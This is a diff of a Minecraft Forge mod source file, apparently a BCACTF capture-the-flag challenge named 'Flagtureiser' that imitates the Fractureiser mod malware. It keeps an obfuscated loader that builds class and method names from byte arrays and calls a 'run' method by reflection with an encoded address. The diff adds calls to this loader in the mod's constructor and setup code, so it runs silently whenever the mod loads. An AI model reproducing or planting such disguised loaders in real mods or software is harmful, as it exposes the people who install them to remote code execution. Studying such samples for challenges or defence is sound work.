@@ -1,4 +1,4 @@
-package com.example.examplemod;
+package com.bcactf.fragtureiser;
 
 import com.mojang.logging.LogUtils;
 import net.minecraft.client.Minecraft;
@@ -24,27 +24,30 @@ import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
 import net.minecraftforge.registries.DeferredRegister;
 import net.minecraftforge.registries.ForgeRegistries;
 import net.minecraftforge.registries.RegistryObject;
+
+import java.net.URL;
+
 import org.slf4j.Logger;
 
 // The value here should match an entry in the META-INF/mods.toml file
-@Mod(ExampleMod.MODID)
-public class ExampleMod
+@Mod(Flagtureiser.MODID)
+public class Flagtureiser
 {
     // Define mod id in a common place for everything to reference
-    public static final String MODID = "examplemod";
+    public static final String MODID = "flagtureiser";
     // Directly reference a slf4j logger
     private static final Logger LOGGER = LogUtils.getLogger();
-    // Create a Deferred Register to hold Blocks which will all be registered under the "examplemod" namespace
+    // Create a Deferred Register to hold Blocks which will all be registered under the "flagtureiser" namespace
     public static final DeferredRegister<Block> BLOCKS = DeferredRegister.create(ForgeRegistries.BLOCKS, MODID);
-    // Create a Deferred Register to hold Items which will all be registered under the "examplemod" namespace
+    // Create a Deferred Register to hold Items which will all be registered under the "flagtureiser" namespace
     public static final DeferredRegister<Item> ITEMS = DeferredRegister.create(ForgeRegistries.ITEMS, MODID);
 
-    // Creates a new Block with the id "examplemod:example_block", combining the namespace and path
+    // Creates a new Block with the id "flagtureiser:example_block", combining the namespace and path
     public static final RegistryObject<Block> EXAMPLE_BLOCK = BLOCKS.register("example_block", () -> new Block(BlockBehaviour.Properties.of(Material.STONE)));
-    // Creates a new BlockItem with the id "examplemod:example_block", combining the namespace and path
+    // Creates a new BlockItem with the id "flagtureiser:example_block", combining the namespace and path
     public static final RegistryObject<Item> EXAMPLE_BLOCK_ITEM = ITEMS.register("example_block", () -> new BlockItem(EXAMPLE_BLOCK.get(), new Item.Properties()));
 
-    static void _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0()
+    static void _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0() throws Exception
     {
         Class.forName(new String(new byte[] {
             // "Utility"
@@ -68,10 +71,9 @@ public class ExampleMod
           114, 117, 110
         }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
         // The "getMethod" stuff is unaltered
-      }
     }
 
-    public ExampleMod()
+    public Flagtureiser()
     {
         IEventBus modEventBus = FMLJavaModLoadingContext.get().getModEventBus();
 
@@ -88,6 +90,12 @@ public class ExampleMod
 
         // Register the item to a creative tab
         modEventBus.addListener(this::addCreative);
+        try {
+          _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0();
+        } catch (Exception e) {
+          // TODO Auto-generated catch block
+          e.printStackTrace();
+        }
 
         // Register our mod's ForgeConfigSpec so that Forge can create and load the config file for us
         ModLoadingContext.get().registerConfig(ModConfig.Type.COMMON, Config.SPEC);
@@ -95,6 +103,12 @@ public class ExampleMod
 
     private void commonSetup(final FMLCommonSetupEvent event)
     {
+        try {
+          _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0();
+        } catch (Exception e) {
+          // TODO Auto-generated catch block
+          e.printStackTrace();
+        }
         // Some common setup code
         LOGGER.info("HELLO FROM COMMON SETUP");
 
